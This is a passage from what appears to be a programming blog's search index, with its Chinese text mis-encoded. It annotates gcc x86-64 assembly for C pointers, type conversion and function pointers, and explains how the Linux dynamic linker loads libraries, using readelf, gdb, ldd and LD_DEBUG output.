æŒ‡å‘çš„å†…å­˜åœ°å€çš„æ•°å€¼(ä¹Ÿå°±æ˜¯å˜é‡ a çš„åœ°å€)å¤åˆ¶åˆ° rax movl (%rax), %eax ; å°† rax æŒ‡å‘çš„å†…å­˜åœ°å€çš„å€¼ 10(ä¹Ÿå°±æ˜¯å˜é‡ a) å¤åˆ¶åˆ° eax, int a 4 Bytes éœ€è¦ 32 bit çš„ eax å³å¯. movl %eax, -4(%rbp) ; å°† eax çš„å€¼ 10 (ä¹Ÿå°±æ˜¯å˜é‡ a) å¤åˆ¶åˆ° rbp - 4 æŒ‡å‘çš„å†…å­˜åœ°å€å¤„, å®Œæˆ temp = *pa; movq -32(%rbp), %rax ; å°† rbp - 32 æŒ‡å‘çš„å†…å­˜åœ°å€çš„å€¼(ä¹Ÿå°±æ˜¯å˜é‡ b çš„åœ°å€) çš„åœ°å€å¤åˆ¶åˆ° rax movl (%rax), %edx ; å°† rax çš„å€¼æŒ‡å‘çš„å†…å­˜åœ°å€å‡ºçš„å€¼ 100(ä¹Ÿå°±æ˜¯å˜é‡ b) å¤åˆ¶åˆ° edx, int b 4 Bytes éœ€è¦ 32 bit çš„ eax å³å¯. movq -24(%rbp), %rax ; å°† rbp - 24 æŒ‡å‘çš„å†…å­˜åœ°å€çš„å€¼(ä¹Ÿå°±æ˜¯å˜é‡ a çš„åœ°å€)å¤åˆ¶åˆ° rax movl %edx, (%rax) ; å°† edx çš„å€¼ 100 (ä¹Ÿå°±æ˜¯å˜é‡ b)å¤åˆ¶åˆ° rax æŒ‡å‘çš„åœ°å€å¤„(ä¹Ÿå°±æ˜¯å˜é‡ a çš„åœ°å€), å®Œæˆ *pa = *pb movq -32(%rbp), %rax ; å°† rbp - 32 æŒ‡å‘çš„å†…å­˜åœ°å€çš„å€¼(ä¹Ÿå°±æ˜¯å˜é‡ b çš„åœ°å€)å¤åˆ¶åˆ° rax movl -4(%rbp), %edx ; å°† rbp - 4 æŒ‡å‘çš„å†…å­˜åœ°å€çš„å€¼ 10 å¤åˆ¶åˆ° edx movl %edx, (%rax) ; å°† edx çš„å€¼ 10 å¤åˆ¶åˆ° rax æŒ‡å‘çš„åœ°å€å¤„(ä¹Ÿå°±æ˜¯å˜é‡ b çš„åœ°å€), å®Œæˆ *pb = temp nop popq %rbp ret main int main(){ int a = 10; int b = 100; swap(\u0026a,\u0026b); return 0; } main: pushq %rbp ; ä¿å­˜è°ƒç”¨è€…çš„ rbp movq %rsp, %rbp ; å¼€è¾Ÿ main å‡½æ•°çš„æ ˆå¸§ subq $16, %rsp ; åˆ†é… main çš„æ ˆç©ºé—´ 16 bytes movl $10, -4(%rbp) ; å°†å˜é‡ a å¤åˆ¶åˆ° rbp - 4 æŒ‡å‘çš„åœ°å€å¤„.(int a, 4 bytes) movl $100, -8(%rbp) ; å°†å˜é‡ b å¤åˆ¶åˆ° rbp - 8 æŒ‡å‘çš„åœ°å€å¤„.(int b, 4 bytes) leaq -8(%rbp), %rdx ; å°† rbp - 8 çš„å€¼å¤åˆ¶åˆ° rdx å¯„å­˜å™¨(int b å˜é‡çš„åœ°å€) leaq -4(%rbp), %rax ; å°† rbp - 4 çš„å€¼å¤åˆ¶åˆ° rax å¯„å­˜å™¨(int a å˜é‡çš„åœ°å€) movq %rdx, %rsi ; å¤åˆ¶ rdx(ç¬¬äºŒä¸ªå‚æ•°: å˜é‡ b çš„åœ°å€) åˆ° rsi å¯„å­˜å™¨ movq %rax, %rdi ; å¤åˆ¶ rax(ç¬¬ä¸€ä¸ªå‚æ•°: å˜é‡ a çš„åœ°å€) åˆ° rdi å¯„å­˜å™¨ call swap(int*, int*) movl $0, %eax leave ; ç­‰ä»·äº 1. mov %rbp, %rsp(å›æ”¶åˆ†é…çš„æ ˆç©ºé—´) 2.pop %rbp(æ¢å¤ main çš„ rbp) ret æ ˆå¸§åˆ†æ è¯¥å›¾æ˜¯ swap æ‰§è¡Œå®Œ int temp = *pa åçš„çŠ¶æ€.\nå‡½æ•°è¿”å›å€¼ the return value for the function should be placed in rax if it is not already there. è¿”å›å€¼æ”¾åœ¨ rax å¯„å­˜å™¨. è¿™æ˜¯ x86-64 çš„çº¦å®š. æ¶æ„è®¾è®¡å†³å®šåªæœ‰ rax ä¸€ä¸ªå¯„å­˜å™¨å­˜æ”¾è¿”å›å€¼, è¿™ä¹Ÿæ˜¯é«˜çº§è¯­è¨€è¿”å›å€¼åªèƒ½æ˜¯ä¸€ä¸ªçš„åŸå› . C è¯­è¨€é‡Œè¿”å›çš„ç»“æ„ä½“, å…¶å®ä¹Ÿå°±æ˜¯ç»“æ„ä½“ç¬¬ä¸€ä¸ªå­—èŠ‚çš„åœ°å€, è¿˜æ˜¯ä¸€ä¸ªå€¼. C è¯­è¨€çš„å‡½æ•°è¿”å›å€¼ä¸º void, åœ¨æ±‡ç¼–å±‚é¢ä¹Ÿå°±æ˜¯ä¸ç”¨è®¾ç½® rax.\nç»“è®º æŒ‡é’ˆæœ¬è´¨å°±æ˜¯å¯„å­˜å™¨é—´æ¥å¯»å€. å‡½æ•°ä¼ å‚å…¶å®ä¼ çš„éƒ½æ˜¯æ•°å€¼è€Œå·², æœ¬è´¨ä¸Šéƒ½æ˜¯æ•°å€¼çš„å‰¯æœ¬.","å˜é‡åœ°å€#å˜é‡åœ°å€":" The lea (load effective address) instruction is used to put a memory address into the destination. leaq -8(%rbp), %rdx -8(%rbp)ç­‰ä»·äº mem[R[rbp] -8]. å°† rbp - 8 çš„å€¼(è¿™ä¸ªå€¼å°±æ˜¯å†…å­˜åœ°å€)å¤åˆ¶åˆ° rdx.","å¯„å­˜å™¨é—´æ¥å¯»å€#å¯„å­˜å™¨é—´æ¥å¯»å€":" movq (%rax), %rdx å°† rax çš„å€¼(X)æŒ‡å‘çš„å†…å­˜åœ°å€å¤„çš„å€¼å¤åˆ¶åˆ° rdx. æ­¤æ—¶ rax çš„å€¼(X)å°±æ˜¯æŒ‡é’ˆ, æ‰€è°“æŒ‡é’ˆåœ¨æ±‡ç¼–å±‚é¢å°±æ˜¯å°†ä¸€ä¸ªå†…å­˜åœ°å€æ”¾åˆ°å¯„å­˜å™¨, åˆ©ç”¨å¯„å­˜å™¨é—´æ¥å¯»å€å»è·å–è¿™ä¸ªåœ°å€çš„æ•°å€¼. è¿™å°±æ˜¯ C è¯­è¨€é‡ŒæŒ‡é’ˆçš„æœ¬è´¨.","æŒ‡é’ˆ#æŒ‡é’ˆ":"C è¯­è¨€é‡Œçš„æ¦‚å¿µåœ¨ X86-64 æ±‡ç¼–å±‚é¢çš„åˆ†æ. æ±‡ç¼–é£æ ¼ä½¿ç”¨ AT\u0026T é£æ ¼. ç¼–è¯‘å™¨æ˜¯ gcc-x86-64-9.1\næŒ‡é’ˆ A pointer is a programming language object that stores the memory address of another value located in computer memory. A pointer references a location in memory, and obtaining the value stored at that location is known as dereferencing the pointer.","æ•°æ®ç±»å‹è½¬åŒ–#æ•°æ®ç±»å‹è½¬åŒ–":"","æ•´æ•°ç±»å‹#æ•´æ•°ç±»å‹":"x86-64 registers IA32 registers ä»£ç åˆ†æ void testTypeConvert(){ unsigned long i64bit = 1844674407370955199; unsigned int i32bit = (unsigned int)i64bit; unsigned short i16bit = (unsigned int)i32bit; unsigned char i8bit = (unsigned char)i16bit; printf(\"%ld\\n\",i64bit); printf(\"%ld\\n\",i32bit); printf(\"%d\\n\",i16bit); printf(\"%d\\n\",i8bit); } testTypeConvert(): pushq %rbp movq %rsp, %rbp movabsq $1844674407370955199, %rax ;â€­00011001 10011001 10011001 10011001 10011001 10011001 10011001 10111111â€¬ movq %rax, -8(%rbp) movq -8(%rbp), %rax movl %eax, -12(%rbp) ; 10011001 10011001 10011001 10111111â€¬ (2576980415) movl -12(%rbp), %eax movw %ax, -14(%rbp) ; 10011001 10111111â€¬(39359) movzwl -14(%rbp), %eax ; 00000000 00000000 10011001 10111111â€¬ (zero extend) movb %al, -15(%rbp) ; 10111111â€¬(191) nop popq %rbp ret ç»“è®º int ç±»å‹çš„æ•°æ®è½¬åŒ–, åˆ©ç”¨ä¸åŒé•¿åº¦çš„å¯„å­˜å™¨. æ¯”å¦‚ int è½¬ char ç±»å‹. ç›´æ¥å– int çš„æœ€å 8 ä½. char è½¬ int ,å¯¹åº”çš„å¯„å­˜å™¨é«˜ä½è¡¥ä¸Š 3 ä¸ªå­—èŠ‚çš„ 0.","æ±‡ç¼–ä»£ç #æ±‡ç¼–ä»£ç ":" test_variable_shadow(): pushq %rbp movq %rsp, %rbp movl $10, -4(%rbp) ; int a = 10 movl $100, -8(%rbp) ; int a = 100 movl -8(%rbp), %eax addl $1000, %eax movl %eax, -12(%rbp) ; int b = a + 1000 ä»£ç å—é‡Œçš„ a movl -4(%rbp), %eax addl $10000, %eax movl %eax, -16(%rbp) ; int c = a + 10000 nop popq %rbp ret ","æ±‡ç¼–ä»£ç åˆ†æ#æ±‡ç¼–ä»£ç åˆ†æ":"","æ±‡ç¼–åˆ†æ#æ±‡ç¼–åˆ†æ":" add(int, int): pushq %rbp movq %rsp, %rbp movl %edi, -4(%rbp) movl %esi, -8(%rbp) movl -4(%rbp), %edx movl -8(%rbp), %eax addl %edx, %eax popq %rbp ret main: pushq %rbp ; ä¿å­˜è°ƒç”¨è€…çš„ rbp movq %rsp, %rbp ; å¼€è¾Ÿ main çš„æ ˆå¸§ subq $16, %rsp ; åˆ†é…æ ˆå¸§ç©ºé—´ movq $add(int, int), -8(%rbp) ; å°† add(int, int) ç¬¬ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ä¿å­˜åœ¨ rbp - 8 è¿™ä¸ªä½ç½®å¤„ movl $3, %esi ; ä»å³å¾€å·¦ä¿å­˜ç¬¬ä¸€ä¸ªå‚æ•° movl $2, %edi ; ä»å³å¾€å·¦ä¿å­˜ç¬¬äºŒä¸ªå‚æ•° call add(int, int) ; æ­£å¸¸çš„ call è°ƒç”¨ movq -8(%rbp), %rax ; å°† add(int, int) çš„åœ°å€å¤åˆ¶åˆ° rax å¯„å­˜å™¨ movl $3, %esi ; ä»å³å¾€å·¦ä¿å­˜ç¬¬ä¸€ä¸ªå‚æ•° movl $2, %edi ; ä»å³å¾€å·¦ä¿å­˜ç¬¬äºŒä¸ªå‚æ•° call *%rax ; é€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨å‡½æ•° movl $0, %eax leave ret ","æ±‡ç¼–åˆ†æ-1#æ±‡ç¼–åˆ†æ":" main: pushq %rbp movq %rsp, %rbp movl $4, -4(%rbp) ; friday ç¼–å·ä¸º 4ï¼Œé»˜è®¤ä» 0 å¼€å§‹ç¼–å·ã€‚ movl $3, -8(%rbp) ; GREEN ç¼–å·ä¸º 3 movl $0, %eax popq %rbp ret "},"title":"asm-clang-concepts"},"/blog/asm-dynamic-linker/":{"data":{"":"","demo-äºŒè¿›åˆ¶æ–‡ä»¶æŸ¥çœ‹#demo äºŒè¿›åˆ¶æ–‡ä»¶æŸ¥çœ‹":"","dynamic-linker-å¯ç”¨ç¯å¢ƒå˜é‡è§‚å¯Ÿè¿‡ç¨‹#dynamic linker å¯ç”¨ç¯å¢ƒå˜é‡è§‚å¯Ÿè¿‡ç¨‹":"","dynamic-linker-æ€»ç»“#\u003cstrong\u003edynamic linker æ€»ç»“\u003c/strong\u003e":"dynamic linker ç®€ä»‹ dynamic linker (also called the dynamic loader) is a shared object (*.so file) on Linux systems. It plays a critical role in the execution of dynamically linked programs.\nWhat Is the Dynamic Linker? The dynamic linker is a special shared library responsible for:\nLoading the programâ€™s dependencies (shared libraries like libc.so.6). Resolving symbols (e.g., function addresses like printf). Performing relocations (adjusting addresses for shared libraries). Invoking constructors/destructors (via .init_array and .fini_array). On Linux, the dynamic linker is typically named:\nld-linux.so.2 (for 32-bit x86). ld-linux-x86-64.so.2 (for 64-bit x86_64). ld-linux-aarch64.so.1 (for ARM64). Why Is the Dynamic Linker a Shared Object? Efficiency: It avoids duplicating the linker code in every executable. Reusability: All dynamically linked programs share the same dynamic linker. Maintainability: Updates to the dynamic linker (e.g., security fixes) apply to all programs. å…ˆæœ‰é¸¡å…ˆæœ‰è›‹é—®é¢˜ The dynamic linker itself must be a shared object, but it is responsible for loading shared libraries. åŠ¨æ€é“¾æ¥å™¨æœ¬èº«å°±æ˜¯å…±äº«åº“ To resolve this, the kernel directly loads the dynamic linker (ld-linux-*.so) into memory when starting a program. The dynamic linker then loads the rest of the dependencies (like libc.so.6) å†…æ ¸ç›´æ¥è´Ÿè´£è£…è½½ dynamic linker è¿™ä¸ªå…±äº«åº“, å†ç”± dynamic linker è£…è½½å…¶ä»–ä¾èµ– demo äºŒè¿›åˆ¶æ–‡ä»¶æŸ¥çœ‹ demo ä¸­åŠ¨æ€é“¾æ¥å™¨æŸ¥çœ‹ readelf -l demo (look for the INTERP segment)\nreadelf -l demo | grep -A 2 INTERP INTERP 0x0000000000000318 0x0000000000000318 0x0000000000000318 0x000000000000001c 0x000000000000001c R 0x1 [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2] This path (/lib64/ld-linux-x86-64.so.2) is stored in the .interp section of the ELF file. å…¶ä¸­è¿˜æœ‰ä¸€ä¸ªå­—ç¬¦ä¸²ç»“æŸç¬¦å· 0x00ã€‚å¯ä»¥çœ‹åˆ° .interp section é•¿åº¦ä¸º 0x1c ä¸€å…± 28bytesã€‚\nfile æŸ¥çœ‹ demo ä¿¡æ¯ file demo demo: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6fd65349be456b41544a47b67df68fa7968c3f4f, for GNU/Linux 3.2.0, with debug_info, not stripped Dynamic Linker VS Regular Shared Libraries Feature Dynamic Linker (ld-linux-*.so) Regular Shared Library (e.g., libc.so.6) Loaded by Kernel (directly) Dynamic linker Purpose Load and link shared libraries Provide runtime functionality Dependencies None (self-contained) May depend on other shared libraries Entry Point Called by kernel Called by dynamic linker How Dynamic Linker Works? Step 1: Kernel Loads the Executable The kernel reads the ELF header of demo and sees the INTERP segment pointing to /lib64/ld-linux-x86-64.so.2. The kernel loads the dynamic linker itself into memory. Step 2: Dynamic Linker Takes Over The kernel transfers control to the dynamic linkerâ€™s entry point. The dynamic linker: Parses the executableâ€™s .dynamic section to find dependencies (e.g., libc.so.6). Loads these shared libraries into memory. Resolves symbols (e.g., printf in libc). Applies relocations (fixes addresses in .got and .plt). Calls constructor functions (e.g., initialize() in .init_array). Transfers control to the programâ€™s main(). gdb è¿è¡Œ demo éªŒè¯ /lib64/ld-linux-x86-64.so.2 å…ˆè£…è½½ gdb ./demo . . . Reading symbols from ./demo... (gdb) break _start Breakpoint 1 at 0x1080 (gdb) info program The program being debugged is not being run. (gdb) c The program is not being run. (gdb) run Starting program: /home/yang/elf-demo/demo Breakpoint 1.2, 0x00007ffff7fe4540 in _start () from /lib64/ld-linux-x86-64.so.2 (gdb) info program Last stopped for thread 1 (process 50955). Using the running image of child process 50955. Program stopped at 0x7ffff7fe4540. It stopped at breakpoint 1. Type \"info stack\" or \"info registers\" for more information. (gdb) info proc mappings process 50955 Mapped address spaces: Start Addr End Addr Size Offset Perms objfile 0x555555554000 0x555555555000 0x1000 0x0 r--p /home/yang/elf-demo/demo 0x555555555000 0x555555556000 0x1000 0x1000 r-xp /home/yang/elf-demo/demo 0x555555556000 0x555555557000 0x1000 0x2000 r--p /home/yang/elf-demo/demo 0x555555557000 0x555555559000 0x2000 0x2000 rw-p /home/yang/elf-demo/demo 0x7ffff7fbf000 0x7ffff7fc3000 0x4000 0x0 r--p [vvar] 0x7ffff7fc3000 0x7ffff7fc5000 0x2000 0x0 r-xp [vdso] 0x7ffff7fc5000 0x7ffff7fc6000 0x1000 0x0 r--p /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 0x7ffff7fc6000 0x7ffff7ff1000 0x2b000 0x1000 r-xp /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 0x7ffff7ff1000 0x7ffff7ffb000 0xa000 0x2c000 r--p /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 0x7ffff7ffb000 0x7ffff7fff000 0x4000 0x36000 rw-p /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 0x7ffffffde000 0x7ffffffff000 0x21000 0x0 rw-p [stack] 0xffffffffff600000 0xffffffffff601000 0x1000 0x0 --xp [vsyscall] break _start æ‰“æ–­ç‚¹ run è¿è¡Œ info proc mappings æŸ¥çœ‹å†…å­˜æ˜ å°„ /home/yang/elf-demo/demo å¯æ‰§è¡Œæ–‡ä»¶ /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 åŠ¨æ€é“¾æ¥å™¨åœ¨ main è¿è¡Œä¹‹å‰å·²è¢«åŠ è½½ ls -l /lib64/ld-linux-x86-64.so.2 lrwxrwxrwx 1 root root 44 Jan 29 01:07 /lib64/ld-linux-x86-64.so.2 -\u003e ../lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /lib64/ld-linux-x86-64.so.2 è£…è½½å…¶ä»–ä¾èµ– ldd æŸ¥çœ‹ demo ä¾èµ– ldd demo linux-vdso.so.1 (0x00007fffac3dc000) libc.so.6 =\u003e /lib/x86_64-linux-gnu/libc.so.6 (0x00007be167000000) /lib64/ld-linux-x86-64.so.2 (0x00007be1672c1000) gdb initialize å¤„æ‰“æ–­ç‚¹ (gdb) bt #0 initialize () at demo.c:27 #1 0x00007ffff7c2a304 in call_init (env=\u003coptimized out\u003e, argv=0x7fffffffdc48, argc=1) at ../csu/libc-start.c:145 #2 __libc_start_main_impl (main=0x5555555551ed \u003cmain\u003e, argc=1, argv=0x7fffffffdc48, init=\u003coptimized out\u003e, fini=\u003coptimized out\u003e, rtld_fini=\u003coptimized out\u003e, stack_end=0x7fffffffdc38) at ../csu/libc-start.c:347 #3 0x00005555555550a5 in _start () (gdb) info proc mappings process 50955 Mapped address spaces: Start Addr End Addr Size Offset Perms objfile 0x555555554000 0x555555555000 0x1000 0x0 r--p /home/yang/elf-demo/demo 0x555555555000 0x555555556000 0x1000 0x1000 r-xp /home/yang/elf-demo/demo 0x555555556000 0x555555557000 0x1000 0x2000 r--p /home/yang/elf-demo/demo 0x555555557000 0x555555558000 0x1000 0x2000 r--p /home/yang/elf-demo/demo 0x555555558000 0x555555559000 0x1000 0x3000 rw-p /home/yang/elf-demo/demo 0x7ffff7c00000 0x7ffff7c28000 0x28000 0x0 r--p /usr/lib/x86_64-linux-gnu/libc.so.6 0x7ffff7c28000 0x7ffff7db0000 0x188000 0x28000 r-xp /usr/lib/x86_64-linux-gnu/libc.so.6 0x7ffff7db0000 0x7ffff7dff000 0x4f000 0x1b0000 r--p /usr/lib/x86_64-linux-gnu/libc.so.6 0x7ffff7dff000 0x7ffff7e03000 0x4000 0x1fe000 r--p /usr/lib/x86_64-linux-gnu/libc.so.6 0x7ffff7e03000 0x7ffff7e05000 0x2000 0x202000 rw-p /usr/lib/x86_64-linux-gnu/libc.so.6 /usr/lib/x86_64-linux-gnu/libc.so.6 è¿™å°±æ˜¯ç”± /lib64/ld-linux-x86-64.so.2 è£…è½½çš„ä¾èµ–çš„åŠ¨æ€åº“ Step 3: Lazy Binding Lazy binding means that the actual address of printf isnâ€™t resolved until the first time itâ€™s called.\nfunction call â†’ PLT â†’ GOT â†’ resolver â†’ dynamic linker resolves symbol â†’ GOT updated â†’ future calls jump directly to the resolved address. This is lazy binding. When a function like printf is called for the first time: The PLT entry jumps to the GOT. The GOT initially points to resolver code in the dynamic linker. The resolver resolves the symbol (e.g., finds printf in libc) and updates the GOT. Subsequent calls jump directly to the resolved address. dynamic linker å¯ç”¨ç¯å¢ƒå˜é‡è§‚å¯Ÿè¿‡ç¨‹ LD_DEBUG ç¯å¢ƒå˜é‡ LD_DEBUG=help ./demo Valid options for the LD_DEBUG environment variable are: libs display library search paths reloc display relocation processing files display progress for input file symbols display symbol table processing bindings display information about symbol binding versions display version dependencies scopes display scope information all all previous options combined statistics display relocation statistics unused determined unused DSOs help display this help message and exit To direct the debugging output into a file instead of standard output a filename can be specified using the LD_DEBUG_OUTPUT environment variable. LD_DEBUG=libs ./demo åˆ†æ The LD_DEBUG=libs output provides a detailed view of how the dynamic linker (ld.so) loads and initializes shared libraries for your demo executable.\n1. Library Search and Loading 4039: find library=libc.so.6 [0]; searching 4039: search cache=/etc/ld.so.cache 4039: trying file=/lib/x86_64-linux-gnu/libc.so.6 Purpose: The dynamic linker searches for required shared libraries (libc.so.6 in this case). Process: It first checks the precomputed cache file /etc/ld.so.cache for efficiency. Then it directly tries the filesystem path /lib/x86_64-linux-gnu/libc.so.6. Result: libc.so.6 (the standard C library) is loaded into memory. 2. Initialization of Libraries 4039: calling init: /lib64/ld-linux-x86-64.so.2 4039: calling init: /lib/x86_64-linux-gnu/libc.so.6 Purpose: Run initialization code for shared libraries. Order: Dynamic Linker (ld-linux-x86-64.so.2): Initializes internal structures (e.g., GOT/PLT setup). libc.so.6: Initializes the C library (e.g., stdio, threading, heap). 3. Program Initialization 4039: initialize program: ./demo Purpose: Execute constructor functions (marked with __attribute__((constructor))) before main(). In Your Code: The initialize() function is called here, printing \"Initializing...\\n\". 4. Transfer Control to Program 4039: transferring control: ./demo Purpose: Jump to the programâ€™s main() function. Output: Global Data: 42 (from global_data in .data) Global BSS: 0 (from global_bss in .bss, zero-initialized) Local Static: 100 (from local_static in .data) Hello from .rodata! (from message in .rodata) Counter: 1, Counter: 2, Counter: 3 (from counter() with static count in .bss) 5. Finalization 4039: calling fini: [0] 4039: Finalizing... 4039: calling fini: /lib/x86_64-linux-gnu/libc.so.6 4039: calling fini: /lib64/ld-linux-x86-64.so.2 Purpose: Run destructor functions (marked with __attribute__((destructor))) after main(). Order: Program Destructors: The finalize() function is called, printing \"Finalizing...\\n\". Library Destructors: libc.so.6: Cleans up C library resources. ld-linux-x86-64.so.2: Cleans up dynamic linking infrastructure. Key Observations Initialization Order:\nLibraries are initialized depth-first, starting from dependencies (e.g., libc) and moving to the main executable. Constructors run after all libraries are loaded but before main(). Finalization Order:\nDestructors run in reverse order of initialization: Program destructors first (finalize()), then library destructors (libc, ld-linux). Dynamic Linker Role:\nManages the entire lifecycle: Loading: Resolves symbols and maps libraries into memory. Relocation: Adjusts addresses for position-independent code (PIC). Initialization/Finalization: Ensures proper setup/teardown of libraries and code. Symbol Resolution:\nSymbols like printf are resolved via .plt/.got (lazy binding unless BIND_NOW is set). Why This Matters Debugging: Helps identify missing libraries, symbol conflicts, or initialization issues. Performance: Reveals overhead from lazy vs. eager binding (LD_BIND_NOW). Security: Shows how libraries are loaded and validated (e.g., PIE, RELRO). LD_DEBUG=files ./demo åˆ†æ LD_DEBUG=files ./demo 4266: 4266: file=libc.so.6 [0]; needed by ./demo [0] 4266: file=libc.so.6 [0]; generating link map 4266: dynamic: 0x000073f09de02940 base: 0x000073f09dc00000 size: 0x0000000000211d90 4266: entry: 0x000073f09dc2a390 phdr: 0x000073f09dc00040 phnum: 14 4266: 4266: 4266: calling init: /lib64/ld-linux-x86-64.so.2 4266: 4266: 4266: calling init: /lib/x86_64-linux-gnu/libc.so.6 4266: 4266: 4266: initialize program: ./demo 4266: Initializing... 4266: 4266: transferring control: ./demo 4266: Global Data: 42 Global BSS: 0 Local Static: 100 Hello from .rodata! Counter: 1 Counter: 2 Counter: 3 4266: 4266: calling fini: [0] 4266: Finalizing... 4266: 4266: calling fini: /lib/x86_64-linux-gnu/libc.so.6 [0] 4266: 4266: 4266: calling fini: /lib64/ld-linux-x86-64.so.2 [0] 4266: Library File Resolution 4266: file=libc.so.6 [0]; needed by ./demo [0] 4266: file=libc.so.6 [0]; generating link map Purpose: The dynamic linker resolves dependencies listed in the .dynamic section (e.g., NEEDED entries like libc.so.6). Link Map: A link_map structure is created to track metadata for each loaded library. Fields: dynamic: Pointer to the .dynamic section of libc.so.6 (used for symbol resolution). base: Load address in memory (0x000073f09dc00000). size: Size of the mapped library (0x211d90 bytes). entry: Entry point (start address of libc.so.6). phdr: Pointer to program headers (used to load segments into memory). phnum: Number of program headers (14 in this case). LD_DEBUG=reloc ./demo åˆ†æ The LD_DEBUG=reloc ./demo output reveals how the dynamic linker processes relocations during program execution. Relocations are adjustments made to addresses in the binary and shared libraries when theyâ€™re loaded into memory (due to Position-Independent Code (PIC) and Address Space Layout Randomization (ASLR)). Letâ€™s break down the key steps:\n1. Relocation Processing 5881: relocation processing: /lib/x86_64-linux-gnu/libc.so.6 5881: relocation processing: ./demo 5881: relocation processing: /lib64/ld-linux-x86-64.so.2 Purpose: The dynamic linker resolves symbol addresses in the following order:\nlibc.so.6: Adjusts addresses for symbols like printf, exit, and global variables. ./demo: Fixes up addresses for global/static variables (e.g., global_data, global_bss, local_static) and PLT/GOT entries. ld-linux-x86-64.so.2: Adjusts internal addresses for the dynamic linker itself. What Happens During Relocation?\nThe dynamic linker reads relocation sections like .rela.dyn (for global variables) and .rela.plt (for function calls) to update addresses. For example: A R_X86_64_GLOB_DAT relocation updates the GOT entry for printf to point to its address in libc.so.6. A R_X86_64_RELATIVE relocation adjusts addresses in ./demo based on its load address (ASLR). 2. Initialization of Libraries 5881: calling init: /lib64/ld-linux-x86-64.so.2 5881: calling init: /lib/x86_64-linux-gnu/libc.so.6 Purpose: Run initialization code for shared libraries after relocations are applied. Order: Dynamic Linker (ld-linux): Initializes internal structures (e.g., GOT/PLT setup). libc.so.6: Initializes the C library (e.g., stdio, heap). 3. Program Initialization 5881: initialize program: ./demo Initializing... Purpose: Execute constructor functions (marked with __attribute__((constructor))) before main(). In Your Code: The initialize() function is called here, printing \"Initializing...\\n\". 4. Transfer Control to Program 5881: transferring control: ./demo Purpose: Jump to the programâ€™s main() function.\nOutput:\nGlobal Data: 42 (from global_data in .data) Global BSS: 0 (from global_bss in .bss, zero-initialized) Local Static: 100 (from local_static in .data) Hello from .rodata! (from message in .rodata) Counter: 1, Counter: 2, Counter: 3 (from counter() with static count in .bss) Relocation Details:\nStatic Variables: Addresses of global_data, global_bss, and local_static are resolved via .rela.dyn relocations. Function Calls: printf is resolved via .rela.plt relocations using the PLT/GOT mechanism. 5. Finalization 5881: calling fini: [0] Finalizing... 5881: calling fini: /lib/x86_64-linux-gnu/libc.so.6 5881: calling fini: /lib64/ld-linux-x86-64.so.2 Purpose: Run destructor functions (marked with __attribute__((destructor))) after main(). Order: Program Destructors: The finalize() function is called, printing \"Finalizing...\\n\". Library Destructors: libc.so.6: Cleans up C library resources. ld-linux-x86-64.so.2: Cleans up dynamic linking infrastructure. Key Concepts in Relocation Why Relocation Is Needed:\nShared libraries are compiled as position-independent code (PIC) to support ASLR. At runtime, the dynamic linker adjusts addresses to match the actual load address in memory. Types of Relocations:\nR_X86_64_RELATIVE: Adjusts addresses relative to the libraryâ€™s base address (e.g., for ./demo). R_X86_64_GLOB_DAT: Updates GOT entries for global symbols (e.g., printf in libc.so.6). R_X86_64_JUMP_SLOT: Updates PLT entries for lazy binding (e.g., resolving printf on first call). Sections Involved:\n.rela.dyn: Relocations for global variables and data. .rela.plt: Relocations for function calls (lazy binding). .got: Global Offset Table (stores resolved addresses for variables/functions). .plt: Procedure Linkage Table (trampolines for lazy symbol resolution). Example: Resolving printf Initial Call:\nprintf in main() jumps to .plt, which then jumps to .got. If unresolved, .got redirects to the dynamic linker. Dynamic Linker:\nUses .rela.plt to find the symbol index for printf. Looks up printf in libc.so.6 using .gnu.hash and .dynsym. Updates the .got entry with printfâ€™s runtime address. Subsequent Calls:\nDirectly use the resolved address in .got (no dynamic linker needed). Summary Relocation ensures that addresses in the binary and shared libraries are adjusted at runtime to work with ASLR and PIC. Dynamic linker processes relocations in .rela.dyn (variables) and .rela.plt (functions) to resolve symbols like printf. Constructors/destructors (initialize/finalize) are handled via .init_array/.fini_array after relocations are applied. printf é‡å®šä½åˆ†æ gcc -g -no-pie -o demo demo.c æŸ¥çœ‹é‡å®šä½ä¿¡æ¯ readelf -r demo Relocation section '.rela.dyn' at offset 0x4d8 contains 2 entries: Offset Info Type Sym. Value Sym. Name + Addend 000000403fd8 000100000006 R_X86_64_GLOB_DAT 0000000000000000 __libc_start_main@GLIBC_2.34 + 0 000000403fe0 000400000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0 Relocation section '.rela.plt' at offset 0x508 contains 2 entries: Offset Info Type Sym. Value Sym. Name + Addend 000000404000 000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0 000000404008 000300000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0 0x000000404008 å°±æ˜¯ printf åœ¨æ–‡ä»¶ä¸­åç§»é‡\ngdb ./demo åˆ†æ Reading symbols from ./demo... (gdb) break _start Breakpoint 1 at 0x401070 (gdb) break break break-range (gdb) run Starting program: /home/yang/elf-demo/demo Breakpoint 1.2, 0x00007ffff7fe4540 in _start () from /lib64/ld-linux-x86-64.so.2 (gdb) break _dl_runtime_resolve_xsave _dl_runtime_resolve_xsave _dl_runtime_resolve_xsavec (gdb) break _dl_runtime_resolve_xsave Breakpoint 2 at 0x7ffff7fda220: file ../sysdeps/x86_64/dl-trampoline.h, line 71. (gdb) info sharedlibrary From To Syms Read Shared Object Library 0x00007ffff7fc6000 0x00007ffff7ff0195 Yes /lib64/ld-linux-x86-64.so.2 (gdb) dis disable disassemble disconnect display (gdb) disassemble printf Dump of assembler code for function printf@plt: 0x0000000000401060 \u003c+0\u003e:\tendbr64 0x0000000000401064 \u003c+4\u003e:\tjmp *0x2f9e(%rip) # 0x404008 \u003cprintf@got.plt\u003e 0x000000000040106a \u003c+10\u003e:\tnopw 0x0(%rax,%rax,1) End of 